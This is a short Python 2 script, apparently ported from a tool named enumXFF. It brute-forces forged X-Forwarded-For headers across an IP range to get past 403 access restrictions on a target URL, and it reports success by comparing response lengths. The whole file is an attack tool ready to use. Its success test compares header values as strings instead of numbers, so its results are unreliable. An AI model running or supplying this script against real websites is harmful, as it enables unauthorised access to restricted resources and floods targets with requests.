#!/usr/bin/env python2.7

'''
This script is python 2 based version of the python 3 script located at
https://github.com/infosec-au/enumXFF
'''

###########
# IMPORTS #
###########

from __future__ import print_function
import argparse
import sys
import iptools
import requests
from tqdm import tqdm


#############
# FUNCTIONS #
#############

def error(*objects):
    print("[!]", *objects, file=sys.stderr)


def info(*objects):
    print("[+]", *objects, file=sys.stdout)


########
# MAIN #
########

if __name__ == '__main__':
    desc = 'Enumerating IPs in X-Forwarded-Headers to bypass 403 restrictions.'

    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("-t", "--target",
                        help="Restricted URL (target)", required=True)
    parser.add_argument("-cl", "--badcl",
                        help="Restricted URL Content Length", required=True)
    parser.add_argument("-r", "--range",
                        help="IP range i.e. 0.0.0.0-255.255.255.255",
                        required=True)
    args = parser.parse_args()

    ip_start, ip_end = args.range.split("-")
    ip_range = iptools.IpRange(ip_start, ip_end)

    for ip in tqdm(ip_range, leave=True):
        try:
            ip_list = ("{0}, ".format(ip) * 50)[:-2]
            x_forwarded_for_header = {"X-Forwarded-For": ip_list}
            response = requests.get(args.target, headers=x_forwarded_for_header)
            if response.headers['content-length'] > args.badcl:
                print("")
                info("Access granted with header: \n{0}".format(x_forwarded_for_header))
                break
        except KeyError:
            error("No Content-Length header contained in request to {0}"
                  .format(ip))
    print("")
